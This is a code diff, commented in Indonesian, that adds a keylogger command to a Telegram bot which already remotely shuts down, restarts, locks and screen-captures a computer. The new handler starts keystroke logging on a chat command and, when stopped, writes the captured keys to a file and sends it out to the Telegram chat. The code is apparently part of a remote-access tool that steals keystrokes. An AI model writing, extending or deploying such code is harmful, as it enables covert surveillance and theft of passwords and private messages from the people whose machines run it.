@@ -15,6 +15,7 @@ from src.system_controls import shutdown, restart, hibernate, say_text, lock_com
 from src.screen_capture import start_screen_capture, stop_screen_capture
 from src.deepseek import ask_question
 from src.utils import read_tokens_from_file
+from src.keylogger import keylogger  # Import keylogger dari keylogger.py
 
 config_tokens = read_tokens_from_file("config.txt")
 IP_SERVER = config_tokens.get("IP_SERVER")
@@ -25,6 +26,30 @@ if not IP_SERVER:
 class TelegramBot:
     def __init__(self, token):
         self.bot = telebot.TeleBot(token)
+
+        # Fungsi untuk menangani command /keylogger start atau /keylogger stop
+        @self.bot.message_handler(commands=['keylogger'])
+        def handle_keylogger(message):
+            args = message.text.split()  # Pisahkan command dan argumen
+            if len(args) < 2:
+                self.bot.reply_to(message, "Usage: /keylogger start or /keylogger stop")
+                return
+            
+            action = args[1].lower()  # Ambil argumen (start/stop)
+
+            if action == "start":
+                keylogger.start()
+                self.bot.reply_to(message, "Keylogger started...")
+            elif action == "stop":
+                keylogger.stop()
+                log_data = keylogger.get_log()
+                
+                with open("keylogger_log.txt", "w") as file:
+                    file.write(log_data)
+
+                self.bot.send_document(message.chat.id, open("keylogger_log.txt", "rb"))
+            else:
+                self.bot.reply_to(message, "Invalid command! Use: /keylogger start or /keylogger stop")
 
         @self.bot.message_handler(commands=['shutdown'])
         def handle_shutdown(message):
